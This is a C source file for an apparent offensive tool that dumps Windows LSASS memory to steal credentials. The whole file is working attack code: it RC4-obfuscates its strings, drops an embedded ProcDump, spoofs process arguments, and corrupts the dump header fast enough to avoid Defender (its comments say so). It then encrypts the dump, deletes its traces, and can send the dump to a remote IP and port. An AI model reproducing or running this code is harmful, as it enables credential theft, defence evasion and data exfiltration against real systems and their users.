#include <Windows.h>
#include <stdio.h>
#include <time.h>

#include "Common.h"
#include "Debug.h"
#include "ProcDump.h"

unsigned char rc4Key[] = {
		0x59, 0xF3, 0x3F, 0x99, 0xD2, 0x3D, 0x4E, 0x67, 0x29, 0xCC, 0xF8, 0x3A, 0x1F, 0x6A, 0x1B, 0xC3,
		0x34, 0xEA, 0x81, 0x0E, 0x36, 0x0D, 0xEA, 0xB2, 0x2D, 0x00, 0x38, 0x0B, 0xA6, 0x89, 0xC1, 0x7A };

unsigned char lsassExeStr[] = {
		0x20, 0x1B, 0x71, 0xD7, 0x20, 0x59, 0x4A, 0xC0, 0x6A, 0xEA, 0x7E, 0x5A, 0xC3, 0xBD, 0x36, 0x19,
		0xF0, 0xFB, 0xE3, 0x5F };

unsigned char procDumpArgs[] = {
		0x61, 0x7A, 0x61, 0xB4, 0x24, 0x29, 0x4D, 0xA5, 0x6C, 0x86, 0x31, 0x7A, 0x8B, 0xD0, 0x2F, 0x19 };

unsigned char dummyProcDumpArgs[] = {
		0x61, 0x1B, 0x63, 0xD7, 0x22, 0x59, 0x5A, 0xC0, 0x7C, 0xEA, 0x20, 0x5A, 0xD2, 0xBD, 0x2B, 0x19,
		0xE0, 0xFB, 0x8F, 0x5F, 0xD5, 0xDF, 0x1C, 0x9C, 0xDD, 0x04, 0xC1, 0x6F, 0xD9, 0x90, 0x3D, 0x93,
		0xDD, 0x71, 0x6B, 0x98, 0xED, 0x99, 0xD4, 0x8E, 0x15, 0x8A, 0x8C, 0xAB, 0xEA, 0x77, 0x0C, 0xAF,
		0xE9, 0x53, 0xEA, 0x7D, 0xA9, 0x41, 0xBF, 0x60, 0x8B, 0x2B, 0x6A, 0x5F, 0x2E, 0xF4, 0xAE, 0x1C,
		0x3B, 0x6D, 0xE0, 0xE1, 0x19, 0x2D, 0x5A, 0xB0, 0xF4, 0x77, 0xFF, 0x03, 0xED, 0x9C, 0xDF, 0x2C,
		0x06, 0x6A, 0x5B, 0x64, 0x26, 0x5A, 0x1B, 0x20, 0x8F, 0xC3, 0x3B, 0xA7, 0xC2, 0xD7, 0xA8, 0x60,
		0xDE, 0x52, 0x06, 0x41, 0x66, 0xED, 0xB5, 0x8C, 0x5C, 0x75, 0x18, 0x66, 0x2A, 0x70, 0x27, 0x47,
		0xDA, 0xFC, 0x38, 0x75, 0x21, 0x00, 0x60, 0x25, 0xA6, 0xB5, 0x66, 0x76, 0x9A, 0x8B, 0x59, 0xAE,
		0xA0, 0xBD, 0x73, 0x84, 0x69, 0x26, 0x21, 0xD5, 0xA9, 0x29, 0xA2, 0x3E, 0x28, 0x80, 0x9D, 0xD9,
		0x67, 0x53, 0xCB, 0xCF, 0xA1, 0xD9, 0xC7, 0xF3, 0xA6, 0x48, 0x65, 0xE5, 0xB1, 0x1C, 0x45, 0x60,
		0x82, 0x3F, 0x03, 0x8A, 0xBD, 0x8F, 0x44, 0x71, 0x37, 0x87, 0xAF, 0x63, 0xB4, 0x68, 0xDA, 0xE4,
		0x09, 0x20, 0xAE, 0xA7, 0x9F, 0x12, 0xF3, 0x4A, 0xA7, 0x11, 0x75, 0xED, 0xB3, 0xFA, 0xAA, 0xB0,
		0xC7, 0x33, 0x5D, 0xAC, 0xEE, 0xC5, 0xA1, 0x91, 0x66, 0x75, 0x17, 0x99, 0x89, 0x4B, 0x83, 0x6B,
		0x90, 0xFB, 0x5F, 0xA2, 0xE9, 0x62, 0x32, 0x59 };

unsigned char comsvcsArgs[] = {
		0x0F, 0x1B, 0x38, 0xD7, 0x1D, 0x59, 0x6E, 0xC0, 0x70, 0xEA, 0x3E, 0x5A, 0xC2, 0xBD, 0x21, 0x19,
		0xE2, 0xFB, 0x90, 0x5F, 0xE8, 0xDF, 0x6F, 0x9C, 0x89, 0x04, 0xDF, 0x6F, 0xDD, 0x90, 0x78, 0x93,
		0xD5, 0x71, 0x20, 0x98, 0xAF, 0x99, 0xE4, 0x8E, 0x08, 0x8A, 0x8B, 0xAB, 0xE1, 0x77, 0x1A, 0xAF,
		0xAB, 0x53, 0xE3, 0x7D, 0xE2, 0x41, 0xE8, 0x60, 0x85, 0x2B, 0x22, 0x5F, 0x39, 0xF4, 0xEB, 0x1C,
		0x58, 0x6D, 0x99, 0xE1, 0x7F, 0x2D, 0x42, 0xB0, 0xD6, 0x77, 0xFB, 0x03, 0xF3, 0x9C, 0xC8, 0x2C,
		0x35, 0x6A, 0x49, 0x64, 0x2D, 0x5A, 0x37, 0x20, 0xB0, 0xC3, 0x2D, 0xA7, 0xC3, 0xD7, 0xB9, 0x60,
		0xC9, 0x52, 0x34, 0x41, 0x3D, 0xED, 0xEE, 0x8C, 0x67, 0x75, 0x13, 0x66, 0x30, 0x70, 0x39, 0x47,
		0xC8, 0xFC, 0x29, 0x75, 0x27, 0x00, 0x3D, 0x25, 0xEC, 0xB5, 0x6F, 0x76, 0x86, 0x8B, 0x15, 0xAE,
		0xAD, 0xBD, 0x5D, 0x84, 0x70, 0x26, 0x3A, 0xD5, 0xE0, 0x29, 0xDE, 0x3E, 0x6D, 0x80, 0xD0, 0xD9,
		0x3A, 0x53, 0xA6, 0xCF };

unsigned char dummyComsvcsArgs[] = {
		0x0F, 0x1B, 0x38, 0xD7, 0x1D, 0x59, 0x6E, 0xC0, 0x70, 0xEA, 0x3E, 0x5A, 0xC2, 0xBD, 0x21, 0x19,
		0xE2, 0xFB, 0x90, 0x5F, 0xE8, 0xDF, 0x6F, 0x9C, 0x89, 0x04, 0xDF, 0x6F, 0xDD, 0x90, 0x78, 0x93,
		0xD5, 0x71, 0x20, 0x98, 0xAF, 0x99, 0xE4, 0x8E, 0x08, 0x8A, 0x8B, 0xAB, 0xE1, 0x77, 0x1A, 0xAF,
		0xAB, 0x53, 0xE3, 0x7D, 0xE2, 0x41, 0xE8, 0x60, 0x85, 0x2B, 0x22, 0x5F, 0x39, 0xF4, 0xEB, 0x1C,
		0x58, 0x6D, 0x95, 0xE1, 0x35, 0x2D, 0x7B, 0xB0, 0xEF, 0x77, 0xDD, 0x03, 0xED, 0x9C, 0xD8, 0x2C,
		0x33, 0x6A, 0x53, 0x64, 0x37, 0x5A, 0x11, 0x20, 0x82, 0xC3, 0x20, 0xA7, 0xD9, 0xD7, 0xA2, 0x60,
		0xC2, 0x52, 0x1A, 0x41, 0x61, 0xED, 0xB2, 0x8C, 0x4F, 0x75, 0x02, 0x66, 0x30, 0x70, 0x38, 0x47,
		0xEB, 0xFC, 0x3E, 0x75, 0x2A, 0x00, 0x2B, 0x25, 0xAE, 0xB5, 0x2B, 0x76, 0xC5, 0x8B, 0x1A, 0xAE,
		0xE1, 0xBD, 0x75, 0x84, 0x78, 0x26, 0x3A, 0xD5, 0xFC, 0x29, 0xEA, 0x3E, 0x22, 0x80, 0xC9, 0xD9,
		0x2F, 0x53, 0xCB, 0xCF, 0xB4, 0xD9, 0xCC, 0xF3, 0xEF, 0x48, 0x3E, 0xE5, 0xE1, 0x1C, 0x13, 0x60,
		0x82, 0x3F, 0x01, 0x8A, 0xB0, 0x8F, 0x4F, 0x71, 0x25, 0x87, 0xB8, 0x63, 0xA7, 0x68, 0xCB, 0xE4,
		0x52, 0x20, 0xA3, 0xA7, 0xD3, 0x12, 0xAE, 0x4A, 0xE7, 0x11, 0x31, 0xED, 0xEC, 0xFA, 0xA7, 0xB0,
		0xC4, 0x33, 0x4A, 0xAC, 0xFC, 0xC5, 0xF5, 0x91, 0x20, 0x75, 0x17, 0x99, 0x97, 0x4B, 0xD7, 0x6B,
		0xCA, 0xFB, 0x02, 0xA2, 0xED, 0x62, 0x48, 0x59, 0xBC, 0xCF, 0xF6, 0xC6, 0x5C, 0xC1, 0x18, 0x71,
		0x84, 0x01, 0x4C, 0xE3, 0x42, 0xB7, 0x40, 0xC8, 0x81, 0x74, 0x49, 0x71, 0x1F, 0xD3, 0xA0, 0xE7,
		0xE6, 0x78, 0xD8, 0x4E, 0x93, 0x62, 0xA2, 0x2E, 0xEB, 0xF1, 0x23, 0xE1, 0x69, 0xE5, 0x42, 0x18,
		0x41, 0x15, 0xA3, 0x20, 0xA2, 0x13, 0x6E, 0x43, 0x33, 0xDA, 0xB2, 0x16, 0x4E, 0x66, 0x2B, 0xB8,
		0x51, 0xCC, 0xC2, 0xB9, 0xBE, 0xCE, 0x58, 0x88, 0xAD, 0x08, 0x6D, 0xF0, 0xD4, 0x83 };

//==========================================================================================================================================================

BOOL GetRemoteProcessInfo(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {
	fnNtQuerySystemInformation   pNtQuerySystemInformation = NULL;
	ULONG                        uReturnLen1 = NULL, uReturnLen2 = NULL;
	PSYSTEM_PROCESS_INFORMATION  SystemProcInfo = NULL;
	NTSTATUS                     STATUS = NULL;
	PVOID                        pValueToFree = NULL;

	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
	if (pNtQuerySystemInformation == NULL) {
#ifdef DEBUG
		printf("[!] GetProcAddress Failed With Error : %d\n", GetLastError());
#endif // DEBUG
		return FALSE;
	}

	pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL) {
#ifdef DEBUG
		printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
#endif // DEBUG
		return FALSE;
	}

	pValueToFree = SystemProcInfo;

	STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0) {
#ifdef DEBUG
		printf("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG
		HeapFree(GetProcessHeap(), 0, pValueToFree);
		return FALSE;
	}

	while (TRUE) {
		// Comparing the enumerated process name to the intended target process
		if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0) {
			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;

			if (phProcess != NULL) { // Only open a handle if phProcess is not NULL
				*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			}
			break;
		}

		if (!SystemProcInfo->NextEntryOffset) {
			break;
		}

		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}

	HeapFree(GetProcessHeap(), 0, pValueToFree);

	if (*pdwPid == NULL)
		return FALSE;
	else
		return TRUE;
}

//==========================================================================================================================================================

BOOL IsPrivileged() {
	BOOL isAdminOrDebugPrivilege = FALSE;
	HANDLE hToken = NULL;

	// Open a handle to the access token for the calling process
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		// First check for administrative privileges
		TOKEN_ELEVATION tokenElevation;
		DWORD dwSize;
		if (GetTokenInformation(hToken, TokenElevation, &tokenElevation, sizeof(tokenElevation), &dwSize)) {
			isAdminOrDebugPrivilege = tokenElevation.TokenIsElevated;
		}

		// Check for SeDebugPrivilege if not already determined to be an admin
		if (!isAdminOrDebugPrivilege) {
			DWORD dwSize = 0;
			GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
			PTOKEN_PRIVILEGES privileges = (PTOKEN_PRIVILEGES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);

			if (privileges && GetTokenInformation(hToken, TokenPrivileges, privileges, dwSize, &dwSize)) {
				LUID luidDebugPrivilege;
				if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidDebugPrivilege)) {
					for (DWORD i = 0; i < privileges->PrivilegeCount; ++i) {
						if ((privileges->Privileges[i].Luid.LowPart == luidDebugPrivilege.LowPart) &&
							(privileges->Privileges[i].Luid.HighPart == luidDebugPrivilege.HighPart) &&
							(privileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)) {
							isAdminOrDebugPrivilege = TRUE;
							break;
						}
					}
				}
			}
			if (privileges) {
				HeapFree(GetProcessHeap(), 0, privileges);
			}
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return isAdminOrDebugPrivilege;
}

//==========================================================================================================================================================
// main function start

int main(int argc, char* argv[])
{
#ifdef DEBUG
	printf("    __  __       _ _   _ _____                        \n");
	printf("   |  \\/  |_   _| | |_(_)  __ \\ _   _ _ __ ___  _ __  \n");
	printf("   | |\\/| | | | | | __| | |  | | | | | '_ ` _ \\| '_ \\ \n");
	printf("   | |  | | |_| | | |_| | |__| | |_| | | | | | | |_) |\n");
	printf("   |_|  |_|\\__,_|_|\\__|_|_____/ \\__,_|_| |_| |_| .__/ \n");
	printf("                                               |_|    \n");
#endif // DEBUG

	if (!IsPrivileged()) {
#ifdef DEBUG
		printf("[!] Dumping LSASS Requires Elevated Priviledges!");
#endif // DEBUG
		return -1;
	}

#ifdef SELF_DELETION

	DeleteSelf();

#endif // SELF_DELETION

	srand(time(NULL));

	DWORD		dwLsassPid = NULL;
	CHAR		szRealCmd[256];

	WCHAR		wszRealCmd[512],
				wszTmpPath[MAX_PATH],
				wszTmpFile[256],
				wszDummyCmd[1024];

	WCHAR* wszProcDumpPath = NULL;

	ParsedArgs	args = ParseArgs(argc, argv);

//==========================================================================================================================================================
// Getting PID of lsass.exe

	Rc4EncryptionViaSystemFunc032(rc4Key, lsassExeStr, sizeof(rc4Key), sizeof(lsassExeStr));

	if (!GetRemoteProcessInfo(lsassExeStr, &dwLsassPid, NULL)) {
#ifdef DEBUG
		wprintf(L"[!] Cound Not Get %s's PID \n", lsassExeStr);
#endif // DEBUG
		return -1;
	}

#ifdef DEBUG
	wprintf(L"[+] Found \"%s\" - Of PID : %d \n", lsassExeStr, dwLsassPid);
#endif // DEBUG

//==========================================================================================================================================================
// Constructing the temp file

	// getting the tmp folder path
	if (!GetTempPathW(MAX_PATH, wszTmpPath)) {
#ifdef DEBUG
		printf("[!] GetTempPathW Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}

	// getting the tmp file name
	time_t now = time(NULL);
	struct tm* timeinfo = localtime(&now);

	wcsftime(wszTmpFile, sizeof(wszTmpFile) / sizeof(WCHAR), L"debug_file_process_info_%Y%m%d_%H%M%S.dmp", timeinfo);

//==========================================================================================================================================================
// Constructing the procdump commands

	if (args.procDumpMode) {

		Rc4EncryptionViaSystemFunc032(rc4Key, procDumpArgs, sizeof(rc4Key), sizeof(procDumpArgs));
		Rc4EncryptionViaSystemFunc032(rc4Key, dummyProcDumpArgs, sizeof(rc4Key), sizeof(dummyProcDumpArgs));

		snprintf(szRealCmd, sizeof(szRealCmd), "%s %s %lu -o %s", args.procDumpPath, procDumpArgs, dwLsassPid, args.tempDmpPath);
		swprintf(wszRealCmd, sizeof(wszRealCmd) / sizeof(WCHAR), L"%S", szRealCmd);

		wszProcDumpPath = ConvertToWideString(args.procDumpPath, strlen(args.procDumpPath));
		swprintf(wszDummyCmd, sizeof(wszDummyCmd) / sizeof(WCHAR), L"%ls %ls %ls%ls", wszProcDumpPath, dummyProcDumpArgs, wszTmpPath, wszTmpFile);
	}

//==========================================================================================================================================================
// Constructing the comsvcs commands

	else {
		Rc4EncryptionViaSystemFunc032(rc4Key, comsvcsArgs, sizeof(rc4Key), sizeof(comsvcsArgs));
		Rc4EncryptionViaSystemFunc032(rc4Key, dummyComsvcsArgs, sizeof(rc4Key), sizeof(dummyComsvcsArgs));

		snprintf(szRealCmd, sizeof(szRealCmd), "%lu %s full", dwLsassPid, args.tempDmpPath);
		swprintf(wszRealCmd, sizeof(wszRealCmd) / sizeof(WCHAR), L"%ls %S", comsvcsArgs, szRealCmd);

		swprintf(wszDummyCmd, sizeof(wszDummyCmd) / sizeof(WCHAR), L"%ls%ls", dummyComsvcsArgs, wszTmpFile);
	}

//==========================================================================================================================================================
// Start process with spoofed arguments

#ifdef DEBUG
	if (args.verboseMode) {
		wprintf(L"[i] Real Command: %s\n", wszRealCmd);
		wprintf(L"[i] Dummy Command: %s\n\n", wszDummyCmd);
	}
#endif // DEBUG

	if (wcslen(wszRealCmd) > wcslen(wszDummyCmd)) {
#ifdef DEBUG
		printf("[!] Real Command Cannot Be Longer Than Dummy Command!\n");
#endif // DEBUG
		goto ErrorCleanUp;
	}

	HANDLE		hProcess = NULL,
				hThread = NULL;

	DWORD		dwProcessId = NULL;
	DWORD		dwArgsLen = NULL;

	if (args.procDumpMode) {
		INT retryCount;
		printf("[i] Dumping LSASS Using ProcDump...\n");
		WriteToFile(ProcDump, sizeof(ProcDump), args.procDumpPath, args.verboseMode);
		dwArgsLen = wcslen(wszProcDumpPath) * 2;
	}
	else {
		printf("[i] Dumping LSASS Using comsvcs.dll...\n");
		dwArgsLen = 64;  // hardcoded since the path is the same
	}

	if (!CreateArgSpoofProcess(wszDummyCmd, wszRealCmd, dwArgsLen, args.verboseMode, &dwProcessId, &hProcess, &hThread)) {
#ifdef DEBUG
		printf("[!] Failed to Create Process!");
#endif // DEBUG
		goto ErrorCleanUp;
	}

//==========================================================================================================================================================
// Looting LSASS dump

#ifdef DEBUG
	if (args.verboseMode) {
		printf("[i] Reading Dump File and Zeroing Bytes...\n");
	}
#endif // DEBUG

	INT		retryCount;

	// We need to modify the dump asap but also can't let it run forever if the dump isn't created
	// If there's a delay, even Sleep(1), it gets caught by defender, so hammer that API
	// It might take longer if the dump is large, 100000 should be a good number
	if (args.procDumpMode) {
		Sleep(100); // Wait a little for the dump file to get created, procdump is slower
	}
	for (retryCount = 0; retryCount < 100000; retryCount++) {
		if (ZeroOutBytes(args.tempDmpPath, 6)) {
			break;
		}
	}

#ifdef DEBUG
	if (args.verboseMode) {
		printf("[i] Retry Count: %d\n", retryCount);
	}
#endif // DEBUG

	if (retryCount == 100000) {
		printf("[!] Failed to Locate Dump File!\n");

		goto ErrorCleanUp;
	}

	PBYTE	pDumpData = NULL;
	DWORD	dwDumpSize = NULL;

	if (ReadFromFile(args.tempDmpPath, &pDumpData, &dwDumpSize)) {
#ifdef DEBUG
		printf("[+] LSASS Dump Read: %.2f MB\n\n", (double)dwDumpSize / (1024 * 1024));
#endif // DEBUG
	}
	else {
		printf("[-] Unable to Read LSASS Dump");
		goto ErrorCleanUp;
	}

	CHAR	rc4Key[RC4KEYSIZE], encRc4Key[RC4KEYSIZE];

	GenerateRandomBytes(rc4Key, RC4KEYSIZE);

	memcpy(encRc4Key, rc4Key, RC4KEYSIZE);

	if (!Rc4EncryptionViaSystemFunc032(rc4Key, pDumpData, RC4KEYSIZE, dwDumpSize)) {
		goto ErrorCleanUp;
	}

//==========================================================================================================================================================
// Clean up files

#ifdef DEBUG
	printf("[i] Cleaning up local files...\n");
#endif // DEBUG

	FileExistsAndDelete(args.tempDmpPath, TRUE);

	if (args.procDumpMode) {
		// Make sure it's deleted, procdump could still be running even after dump file has been created
		for (retryCount = 0; retryCount < 20; retryCount++) {
			if (FileExistsAndDelete(args.procDumpPath, TRUE)) {
				break;
			}
			else {
				Sleep(100);
			}
		}

		if (retryCount == 20) {
#ifdef DEBUG
			printf("[!] Failed to Delete %s\n", args.procDumpPath);
#endif // DEBUG
		}
	}

#ifdef DEBUG
	printf("\n");
#endif // DEBUG

//==========================================================================================================================================================
// Local mode

	if (args.localMode) {
#ifdef DEBUG
		printf("[i] Local Mode Selected. Writing Encrypted Dump File to Disk...\n");
#endif // DEBUG
		WriteToFile(pDumpData, dwDumpSize, args.localDmpPath, TRUE);
		PrintKey(rc4Key, RC4KEYSIZE);
	}

//==========================================================================================================================================================
// Remote mode

	else {
		char				serverIp[16];
		int					serverPort;
		unsigned __int64	combinedKey;

#ifdef DEBUG
		printf("[i] Remote Mode Selected\n");
#endif // DEBUG

		if (ParseIPAndPort(args.remotePath, serverIp, &serverPort, &combinedKey)) {
#ifdef DEBUG
			if (args.verboseMode) {
				printf("[i] Encrypting key with: %llu\n", combinedKey);
			}
#endif // DEBUG
		}
		else {
			printf("[!] Failed to Parse IP and Port, Saving Locally Instead\n");
			WriteToFile(pDumpData, dwDumpSize, args.localDmpPath, TRUE);

			PrintKey(rc4Key, RC4KEYSIZE);

			goto ErrorCleanUp;
		}

		// Encrypting the key with ip
		if (!Rc4EncryptionViaSystemFunc032((PBYTE)&combinedKey, encRc4Key, sizeof(combinedKey), RC4KEYSIZE)) {
			goto ErrorCleanUp;
		}

#ifdef DEBUG
		printf("[i] Connecting to %s:%d\n", serverIp, serverPort);
		printf("[i] Sending Encrypted Key...\n");
#endif // DEBUG

		for (retryCount = 0; retryCount < 3; retryCount++) {
			if (SendFile(serverIp, serverPort, encRc4Key, RC4KEYSIZE)) {
				break;
			}
			printf("[i] Retrying...\n");
			Sleep(1000);
		}

		if (retryCount == 3) {
			printf("[!] Key Transfer Failed, Saving Locally Instead\n");
			WriteToFile(pDumpData, dwDumpSize, args.localDmpPath, TRUE);
			PrintKey(rc4Key, RC4KEYSIZE);

			goto ErrorCleanUp;
		}

#ifdef DEBUG
		printf("[i] Sending Encrypted Dump Data...\n");
		Sleep(1000);
#endif // DEBUG

		for (retryCount = 0; retryCount < 3; retryCount++) {
			if (SendFile(serverIp, serverPort, pDumpData, dwDumpSize)) {
				break;
			}
			printf("[i] Retrying...\n");
			Sleep(1000);
		}

		if (retryCount == 3) {
			printf("[!] Dump Data Transfer Failed, Saving Locally Instead\n");
			WriteToFile(pDumpData, dwDumpSize, args.localDmpPath, TRUE);
			PrintKey(rc4Key, RC4KEYSIZE);

			goto ErrorCleanUp;
		}
	}

//==========================================================================================================================================================
// cleanup functions

	if (pDumpData) {
		HeapFree(GetProcessHeap(), 0, pDumpData);
	}
	free(args.procDumpPath);
	free(args.localDmpPath);
	free(args.tempDmpPath);

	printf("[+] All done!\n\n");

	return 0;

ErrorCleanUp:
	FileExistsAndDelete(args.tempDmpPath, TRUE);

	if (args.procDumpMode) {
		for (retryCount = 0; retryCount < 20; retryCount++) {
			if (FileExistsAndDelete(args.procDumpPath, TRUE)) {
				break;
			}
			else {
				Sleep(100);
			}
		}

		if (retryCount == 20) {
#ifdef DEBUG
			printf("[!] Failed to Delete %s\n", args.procDumpPath);
#endif // DEBUG
		}
	}

	if (pDumpData) {
		HeapFree(GetProcessHeap(), 0, pDumpData);
	}
	free(args.procDumpPath);
	free(args.localDmpPath);
	free(args.tempDmpPath);

	return -1;
}